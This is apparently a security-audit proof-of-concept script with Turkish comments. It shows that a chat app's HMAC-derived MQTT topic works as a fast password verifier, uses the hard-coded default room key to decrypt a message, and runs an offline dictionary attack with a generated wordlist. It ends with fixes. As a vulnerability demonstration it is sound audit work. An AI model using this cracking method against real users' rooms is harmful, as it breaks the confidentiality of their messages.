#!/usr/bin/env python3
"""PoC 17 (W-01): ZK-topic bir parola dogrulayicidir -> cevrimdisi sozluk saldirisi.

live_p2p_chat.py:44-48 -> topic = HMAC-SHA256(room_key, "AEGIS-ZK-ROOM-v3:"+room)[:28 hex]
- HMAC anahtari dogrudan room_key'tir (yavas KDF YOK). Topic broker'da/agda duz metin
  (MQTT 1883, TLS yok) gorunur; herkes aday anahtarlari hizlica deneyebilir.
- app.py:72-73 varsayilan oda/anahtar: "som-tim-01" / "AegisRoom2026!" -> varsayilan
  kurulumda topic HERKES icin hesaplanabilir sabittir; varsayilan anahtari bilen
  saldirgan tum "E2E sifreli" mesajlari cozer.
"""
import os
import sys
import time
import hmac
import shutil
import hashlib
import types

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc17"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)


def install_paho_stub():
    paho = types.ModuleType("paho")
    mqtt = types.ModuleType("paho.mqtt")
    client_mod = types.ModuleType("paho.mqtt.client")

    class CallbackAPIVersion:
        VERSION2 = 2

    class Client:
        def __init__(self, *a, **k):
            pass

    client_mod.CallbackAPIVersion = CallbackAPIVersion
    client_mod.Client = Client
    mqtt.client = client_mod
    paho.mqtt = mqtt
    sys.modules["paho"] = paho
    sys.modules["paho.mqtt"] = mqtt
    sys.modules["paho.mqtt.client"] = client_mod


install_paho_stub()

DEFAULT_ROOM = "som-tim-01"
DEFAULT_KEY = "AegisRoom2026!"


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


def derive_topic(room_key: str, room_name: str) -> str:
    blind_id = hmac.new(
        room_key.encode("utf-8"),
        f"AEGIS-ZK-ROOM-v3:{room_name}".encode("utf-8"),
        hashlib.sha256
    ).hexdigest()[:28]
    return f"aegisvault/v3/zk/{blind_id}"


banner("PoC 17-A: Varsayilan kimlik bilgileri -> topic + mesaj cozumu")

topic = derive_topic(DEFAULT_KEY, DEFAULT_ROOM)
print(f"[1] Varsayilan topic (kaynak koddaki sabitlerden): {topic}")

import crypto_chat

victim_token = crypto_chat.encrypt_message(
    "deadbeef:GercekKullanici: Gizli operasyon saati 21:00", DEFAULT_KEY
)
print("[2] Kurban varsayilan anahtarla mesaj gonderdi ('E2E sifreli' sanarak).")
attacker_plain = crypto_chat.decrypt_message(victim_token, DEFAULT_KEY)["text"]
print(f"[3] Saldirgan (kaynak kodu okuyan herkes) mesaji cozdu: '{attacker_plain}'")
print("[4] MQTT baglantisi TLS'siz 1883 portunda (live_p2p_chat.py:22-23):")
from live_p2p_chat import DEFAULT_PORT
print(f"    DEFAULT_PORT = {DEFAULT_PORT} | TLS baglami yok -> topic agda DUZ METIN gorunur")

banner("PoC 17-B: Zayif parola -> topic uzerinden cevrimdisi sozluk saldirisi")

secret_room_key = "Kis732!!"
secret_room = "taktik-oda"
observed_topic = derive_topic(secret_room_key, secret_room)
print(f"[1] Saldirganin gordugu topic (broker/ag): {observed_topic}")
print(f"    Bilinen/leak: oda adi '{secret_room}' (varsayilan havuzdan)")

words = ["Yaz", "Kis", "Bahar", "Guz", "Operasyon", "Taktik", "Tatbikat", "Asker",
         "Zafer", "Kartal", "Bozkurt", "Anadolu"]
punct = ["", "!", "!!", ".", "#"]
candidates = []
for w in words:
    for n in range(1000):
        for p in punct:
            candidates.append(f"{w}{n:03d}{p}")
            candidates.append(f"{w.lower()}{n:03d}{p}")
with open("rockyou_demo.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(candidates))
print(f"[2] Demo sozlugu: {len(candidates):,} aday (rockyou tarzi kelime+sayi; satir basi 1 HMAC)")

t0 = time.perf_counter()
found = None
found_at = 0
for idx, cand in enumerate(candidates, 1):
    if derive_topic(cand, secret_room) == observed_topic:
        found = cand
        found_at = idx
        break
elapsed = time.perf_counter() - t0

print(f"[3] Sonuc: bulundu={found!r} | {found_at}. adayda | sure={elapsed * 1000:.1f} ms")
print(f"    Hiz: ~{found_at / elapsed:,.0f} HMAC/sn (tek cekirdek CPU) | GPU ile 10^9/sn mertebesi")
print(f"    Not: mesaj AES anahtari scrypt N=32768 ile korunuyor (~10^4/sn GPU cebri),")
print(f"         ama TOPIC dogrulayicisi HMAC-SHA256 -> parola tahmini ~10^5 kat daha ucuz.")
assert found == secret_room_key

banner("PoC 17-C: Sifir bilgi iddiasi ile karsilastirma")

print("[1] live_p2p_chat.py:42-48 kaynak: HMAC anahtari = room_key (KDF'siz):")
import inspect
import live_p2p_chat
src = inspect.getsource(live_p2p_chat.GlobalEncryptedChatSession.__init__)
for line in src.splitlines():
    if "blind_id" in line or "hmac.new" in line or "AEGIS-ZK" in line:
        print(f"    {line.strip()}")

print("\n" + "-" * 72)
print("KANIT: (A) Varsayilan anahtar kaynak kodda sabit -> varsayilan odalar herkese acik;")
print("       (B) topic = hizli HMAC parola dogrulayicisi -> cevrimdisi sozluk saldirisi;")
print("       (C) 'broker oda adini gormez' iddiasi dogru olsa da topic saldirgana")
print("           parola dogrulama oracle'i verir ve 1883/TLS'siz agda duz metin tasinir.")
print("       Oneri: room_key'den topic turetirken scrypt/Argon2 kullanin (N=2^15),")
print("       varsayilan anahtari zorunlu degistirilebilir yapin, MQTT'yi TLS'e (8883) tasiyin.")
print("-" * 72)
